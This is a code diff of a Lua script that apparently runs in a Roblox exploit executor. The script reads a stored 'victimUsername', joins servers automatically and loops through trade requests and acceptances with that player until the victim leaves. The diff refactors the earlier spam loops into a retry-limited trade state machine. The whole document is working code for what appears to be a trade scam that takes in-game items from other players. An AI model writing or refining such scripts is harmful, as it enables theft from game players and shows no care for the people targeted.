@@ -8,7 +8,9 @@ local CONFIG = {
     TRADE_CHECK_INTERVAL = 5, -- seconds
     MESSAGE_CHECK_INTERVAL = 5, -- seconds
     DEVICE_SELECT_DELAY = 0.1, -- seconds
-    TRADE_TIMER_THRESHOLD = 5 -- seconds
+    TRADE_TIMER_THRESHOLD = 5, -- seconds
+    TRADE_REQUEST_DELAY = 0.5, -- seconds between trade requests
+    MAX_TRADE_ATTEMPTS = 20 -- max times to try trading before giving up
 }
 
 -- Services
@@ -56,6 +58,8 @@ local victimUsername = readfile(CONFIG.REQUIRED_FILES.USER_FILE)
 local joinedIds = HttpService:JSONDecode(readfile(CONFIG.REQUIRED_FILES.JOINED_IDS_FILE))
 local didVictimLeave = false
 local tradeTimerValue = 0
+local tradeAttempts = 0
+local isTradingActive = false
 
 -- Device selection
 local function selectDevice()
@@ -94,32 +98,6 @@ local function saveJoinedId(messageId)
     writefile(CONFIG.REQUIRED_FILES.JOINED_IDS_FILE, HttpService:JSONEncode(joinedIds))
 end
 
-local function sendTradeRequest()
-    while task.wait(0.1) do
-        Trade.DeclineRequest:FireServer()
-        local args = { [1] = Players:WaitForChild(victimUsername) }
-        Trade.SendRequest:InvokeServer(unpack(args))
-    end
-end
-
-local function acceptTrade()
-    while task.wait(0.1) do
-        Trade.AcceptTrade:FireServer(285646582)
-    end
-end
-
-local function waitForPlayerLeave()
-    local connection
-    connection = Players.PlayerRemoving:Connect(function(removedPlayer)
-        if removedPlayer.Name == victimUsername then
-            if connection then
-                connection:Disconnect()
-            end
-            didVictimLeave = true
-        end
-    end)
-end
-
 local function isTrading()
     local status = Trade.GetTradeStatus:InvokeServer()
     return status == "StartTrade"
@@ -135,12 +113,74 @@ local function monitorTradeTimer()
     end
 end
 
+local function waitForTradeCompletion()
+    while isTrading() do
+        task.wait(0.1)
+    end
+end
+
+local function sendTradeRequest()
+    local targetPlayer = Players:FindFirstChild(victimUsername)
+    if not targetPlayer then return false end
+    
+    Trade.SendRequest:InvokeServer(targetPlayer)
+    return true
+end
+
+local function processTrade()
+    isTradingActive = true
+    tradeAttempts = 0
+    
+    while isTradingActive and tradeAttempts < CONFIG.MAX_TRADE_ATTEMPTS do
+        local currentStatus = Trade.GetTradeStatus:InvokeServer()
+        
+        if currentStatus == "None" then
+            -- Send new trade request
+            if sendTradeRequest() then
+                tradeAttempts = tradeAttempts + 1
+            end
+            task.wait(CONFIG.TRADE_REQUEST_DELAY)
+            
+        elseif currentStatus == "ReceivingRequest" then
+            -- Accept incoming request
+            Trade.AcceptRequest:FireServer()
+            task.wait(0.5)
+            
+        elseif currentStatus == "StartTrade" then
+            -- Trade is active, accept it
+            Trade.AcceptTrade:FireServer(285646582)
+            task.wait(6) -- Wait for trade to complete
+            waitForTradeCompletion()
+            
+            -- Check if we should continue trading
+            if didVictimLeave or tradeTimerValue > CONFIG.TRADE_TIMER_THRESHOLD then
+                isTradingActive = false
+            end
+        else
+            task.wait(0.5)
+        end
+    end
+    
+    isTradingActive = false
+end
+
+local function waitForPlayerLeave()
+    local connection
+    connection = Players.PlayerRemoving:Connect(function(removedPlayer)
+        if removedPlayer.Name == victimUsername then
+            if connection then
+                connection:Disconnect()
+            end
+            didVictimLeave = true
+            isTradingActive = false
+        end
+    end)
+end
+
 -- Start trade monitoring
 waitForPlayerLeave()
-task.spawn(acceptTrade)
 task.spawn(monitorTradeTimer)
-task.wait(3)
-task.spawn(sendTradeRequest)
+task.spawn(processTrade)
 
 -- Auto-join functionality
 local function autoJoin()
